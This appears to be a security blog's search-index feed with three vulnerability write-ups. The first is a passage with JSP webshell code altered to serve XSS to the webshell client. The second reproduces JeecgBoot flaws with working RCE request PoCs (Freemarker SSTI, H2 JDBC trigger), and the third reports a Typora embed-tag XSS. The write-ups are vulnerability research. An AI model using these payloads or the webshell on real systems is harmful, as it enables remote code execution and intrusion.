objMap.get(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                <span class="built_in">this</span>.Request = objMap.get(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.Response.getClass().getMethod(<span class="string">&quot;setCharacterEncoding&quot;</span>, String.class).invoke(<span class="built_in">this</span>.Response, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="type">byte</span>[] getMagic() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="built_in">this</span>.Session.getClass().getMethod(<span class="string">&quot;getAttribute&quot;</span>, String.class).invoke(<span class="built_in">this</span>.Session, <span class="string">&quot;u&quot;</span>).toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">magicNum</span> <span class="operator">=</span> Integer.parseInt(key.substring(<span class="number">0</span>, <span class="number">2</span>), <span class="number">16</span>) % <span class="number">16</span>;</span><br><span class="line">            <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[magicNum];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; buf.length; ++i) &#123;</span><br><span class="line">                buf[i] = (<span class="type">byte</span>)random.nextInt(<span class="number">256</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="type">byte</span>[] Encrypt(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.key;</span><br><span class="line">            <span class="type">byte</span>[] var3 = var2.getBytes(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            <span class="type">SecretKeySpec</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(var3, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">var5</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">            var5.init(<span class="number">1</span>, var4);</span><br><span class="line">            <span class="type">byte</span>[] var6 = var5.doFinal(var1);</span><br><span class="line"></span><br><span class="line">            Class var7;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var7 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var7.getMethod(<span class="string">&quot;getEncoder&quot;</span>, (Class[])<span class="literal">null</span>).invoke(var7, (Object[])<span class="literal">null</span>);</span><br><span class="line">                var6 = (<span class="type">byte</span>[])var8.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="type">byte</span>[].class).invoke(var8, var6);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                var7 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var10</span> <span class="operator">=</span> var7.newInstance();</span><br><span class="line">                <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> (String)var10.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="type">byte</span>[].class).invoke(var10, var6);</span><br><span class="line">                var11 = var11.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                var6 = var11.getBytes();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class="line">    session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">    Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[] data = c.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));</span><br><span class="line">    <span class="keyword">if</span>(isGetBaseinfo(data))&#123;</span><br><span class="line">        <span class="comment">//设置xss路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xssFilepath</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//xssdata</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xssdata</span> <span class="operator">=</span> <span class="string">&quot;&lt;script&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    window.location.href = &#x27;http://www.baidu.com&#x27;;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="type">Hbrynvsrja</span> <span class="variable">hbrynvsrja</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hbrynvsrja</span>(k,xssFilepath,xssdata);</span><br><span class="line">        <span class="type">String</span> <span class="variable">data2</span> <span class="operator">=</span> hbrynvsrja.getData(pageContext);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">respones2</span> <span class="operator">=</span> pageContext.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(pageContext);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">so</span> <span class="operator">=</span> respones2.getClass().getMethod(<span class="string">&quot;getOutputStream&quot;</span>).invoke(respones2);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">write</span> <span class="operator">=</span> so.getClass().getMethod(<span class="string">&quot;write&quot;</span>, <span class="type">byte</span>[].class);</span><br><span class="line">        write.invoke(so, data2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        so.getClass().getMethod(<span class="string">&quot;flush&quot;</span>).invoke(so);</span><br><span class="line">        so.getClass().getMethod(<span class="string">&quot;close&quot;</span>).invoke(so);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(data).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;%&gt;</span><br></pre></td></tr></table></figure><p><img src="/pic/image-20230816200759827-2273844-2408629.png" alt="image-20230816200759827"></p><p>确实复现出xss了，但是如何进一步RCE和文件读取呢？</p><p><code>webEngine.executeScript</code>中执行的Javascript和在刚刚的baseinfo xss中执行的javascript有什么不一样的地方呢？</p><p><img src="/pic/image-20230816200839667-2273844-2408629.png" alt="image-20230816200839667"></p><p>查了一下JavaFx 和Javascript互动的资料，setMember后可以通过Javascript访问特定的Java方法</p><h1 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h1><p>在主页面<code>MainWindowController</code>实在找不到利用方式。我先看看插件部分<code>PluginViewController</code>。</p><p>sendHTTP的onSuccess回调方法：</p><p><img src="/pic/image-20230817194226515-2408629.png" alt="image-20230817194226515"></p><p>这里sendHTTP方法的onSuccess理论上能实现xss。</p><p>当xss之后，再通过js与Java交互调用本页面的 uploadFile 方法读取文件。</p><p>uploadFile 方法</p><p><img src="/pic/image-20230817195609617-2408629.png" alt="image-20230817195609617"></p><p>直接拼接</p><p><img src="/pic/image-20230817195259491-2408629.png" alt="image-20230817195259491"></p><p>现在需要找到控制<code>message</code>的地方，只要检测调用插件的<code>sendHTTP</code>方法的地方就单独修改响应包，改成xsspayload。</p><p>找了一下代码，发现他调用<code>sendHTTP</code>时，传的是Proxy类。</p><p>用它原有的方法改改</p><p><img src="/pic/image-20230819090634520.png" alt="image-20230819090634520"></p><p>他返回失败时候的内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;exception&quot;,&quot;status&quot;:&quot;fail&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/pic/image-20230818132530415.png" alt="image-20230818132530415"></p><p>成功的时候为：</p><p><img src="/pic/image-20230818133254598.png" alt="image-20230818133254598"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;SFRUUIG...&quot;,&quot;status&quot;:&quot;success&quot;&#125;</span><br></pre></td></tr></table></figure><p>其实就是base64而已，前端代码也只是base64 解码而已。</p><p>构造payload</p><p><img src="/pic/image-20230819091108929.png" alt="image-20230819091108929"></p><p><img src="/pic/image-20230819091027424.png" alt="image-20230819091027424"></p><p>总体效果为</p><p><code>基本信息</code>可以做一个引导使用者点击<code>扩展功能</code>的页面。</p><p><img src="/pic/image-20230819091825336.png" alt="image-20230819091825336"></p><p>点发送</p><p><img src="/pic/image-20230819092101254.png" alt="image-20230819092101254"></p><p>成功读到data.db</p><p><img src="/pic/image-20230819092141461.png" alt="image-20230819092141461"></p><p>虽然成功反制，能读文件，但是是1click的，还不能RCE。</p><h1 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h1><p>// todo</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JeecgBoot SSTI以及JDBC RCE 复现</title>
      <link href="/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/"/>
      <url>/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="JeecgBoot-SSTI以及JDBC-RCE-复现"><a href="#JeecgBoot-SSTI以及JDBC-RCE-复现" class="headerlink" title="JeecgBoot SSTI以及JDBC RCE 复现"></a>JeecgBoot SSTI以及JDBC RCE 复现</h1><p><strong>今天接到消息，jeecgboot有SSTI 和 JDBC RCE漏洞，马上来分析复现一下。</strong></p><p>文笔不好，没去详细分析，随手一写。</p><h2 id="情报"><a href="#情报" class="headerlink" title="情报"></a>情报</h2><p>两个接口存在RCE，分别是<code>/jmreport/queryFieldBySql</code> 和 <code>/jmreport/testConnection</code></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>根据线索：</p><p><img src="/pic/image-20230815194958954.png" alt="image-20230815194958954"></p><p>直接用JADX找到对应代码</p><p><img src="/pic/image-20230815195254073.png" alt="image-20230815195254073"></p><p>很直接嘛，直接传入sql，那直接构造请求先试试：</p><p><img src="/pic/image-20230815195403547.png" alt="image-20230815195403547"></p><p>居然还有黑名单？</p><p><img src="/pic/image-20230815195535360.png" alt="image-20230815195535360"></p><p>输入个简单的试试：</p><p><img src="/pic/image-20230815200130214.png" alt="image-20230815200130214"></p><p>这里起码还有个<strong>SQL注入漏洞</strong>。</p><p>线索中说明了用Freemarker处理了传入的sql语句，那直接打SSTI试试。</p><p><strong>poc</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>123</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;<span class="keyword">open</span> -a calculator.app  \&quot;) &#125;&#x27; &quot;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/pic/image-20230815191939722.png" alt="image-20230815191939722"></p><p><img src="/pic/image-20230815200355970.png" alt="image-20230815200355970"></p><h2 id="JDBC-RCE"><a href="#JDBC-RCE" class="headerlink" title="JDBC RCE"></a>JDBC RCE</h2><p>漏洞利用有个前提，必须有H2驱动的依赖。</p><p>用JADX在反编译的代码中搜索<code>testConnection</code>，找到对应的接口</p><p>org.jeecg.modules.jmreport.desreport.a.a#a(org.jeecg.modules.jmreport.dyndb.vo.JmreportDynamicDataSourceVo)</p><p><img src="/pic/image-20230815191024482.png" alt="image-20230815191024482"></p><p>在IDEA中查看。</p><p>代码被压的爹妈都不认识了。</p><p><img src="/pic/image-20230815193231824.png" alt="image-20230815193231824"></p><p><img src="/pic/image-20230815193218204.png" alt="image-20230815193218204"></p><p>根据入参<code>@RequestBody JmreportDynamicDataSourceVo var1</code> 知道，传入一个<code>JmreportDynamicDataSourceVo</code> 对象的JSON。</p><p><strong>JmreportDynamicDataSourceVo</strong> </p><p><img src="/pic/image-20230815193709868.png" alt="image-20230815193709868"></p><p>里面能自定义dbUrl，那么就直接构造参数，试试看。</p><p>dbUrl用前段时间的<code>metabase poc</code> 改改。</p><p><img src="/pic/image-20230815194412994.png" alt="image-20230815194412994"></p><p>很简单就弹计算器了。</p><p><strong>poc</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/testConnection</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.90.1:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-powershell">&#123;</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;code&quot;</span>: <span class="string">&quot;dataSource1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbType&quot;</span>: <span class="string">&quot;H2&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbDriver&quot;</span>: <span class="string">&quot;org.h2.Driver&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUrl&quot;</span>: <span class="string">&quot;jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS <span class="variable">$</span><span class="variable">$</span>//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)\u000A<span class="variable">$</span><span class="variable">$</span>&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbName&quot;</span>: <span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUsername&quot;</span>: <span class="string">&quot;sa&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbPassword&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;connectTimes&quot;</span>: <span class="number">5</span></span></span><br><span class="line"><span class="language-powershell">&#125;</span></span><br><span class="line"><span class="language-powershell"></span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ol><li>Freemarker 可以进一步注入内存马。</li><li>H2 RCE 其实也可以注入内存马。</li><li>jeecgboot 如没有特地引入H2驱动依赖，其实也能用另一种方式成功RCE，暂时不放出来。</li></ol><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入</a></p><p><img src="/pic/image-20230815191842459.png" alt="墨菲"></p><p><a href="https://www.oscs1024.com/hd/MPS-4hzd-mb73">jeecg-boot/积木报表基于SSTI的任意代码执行漏洞</a></p><p><a href="https://www.oscs1024.com/hd/MPS-bjs4-n6dm">jeecg-boot/积木报表基于H2驱动的任意代码执行漏洞</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Typora XSS Vulnerability</title>
      <link href="/2023/07/31/Typora-XSS-Vulnerability/"/>
      <url>/2023/07/31/Typora-XSS-Vulnerability/</url>
      
        <content type="html"><![CDATA[<h1 id="Typora-XSS-Vulnerability"><a href="#Typora-XSS-Vulnerability" class="headerlink" title="Typora XSS Vulnerability"></a>Typora XSS Vulnerability</h1><h2 id="Vulnerability-Overview"><a href="#Vulnerability-Overview" class="headerlink" title="Vulnerability Overview"></a>Vulnerability Overview</h2><p>There is an XSS vulnerability because the editor mishandled when parsing the embed tag in html. The html tag is <code>&lt;embed src=&quot;http://14.rs&quot;&gt;</code></p><h2 id="Vulnerability-Reproduction"><a href="#Vulnerability-Reproduction" class="headerlink" title="Vulnerability Reproduction"></a>Vulnerability Reproduction</h2><ol><li><p>Download the lastest version of Typora from <a href="https://typora.io/">https://typora.io/</a>.</p><p>The version when I downloaded was <code>1.6.7</code>.</p><p><img src="/pic/image-20230731105005835.png" alt="image-20230731105005835"></p></li><li><p>Use Typora to open or edit a markdown file.</p><p>For example, I created a file called “xss test.md” with typora.</p><p><img src="/pic/image-20230731105728197.png" alt="image-20230731105728197"></p></li></ol><ol><li><p>Enter <code>&lt;embed src=http://14.rs&gt;</code> to let Typora parse the html tags, resulting in the execution of malicious Javascript.</p><p>When just entering the embed tag:</p><p><img src="/pic/image-20230731110218892.png" alt="image-20230731110218892"></p><p>After Typora parses the embed tag:</p><p><img src="/pic/image-20230731110446565.png" alt="image-20230731110446565"></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
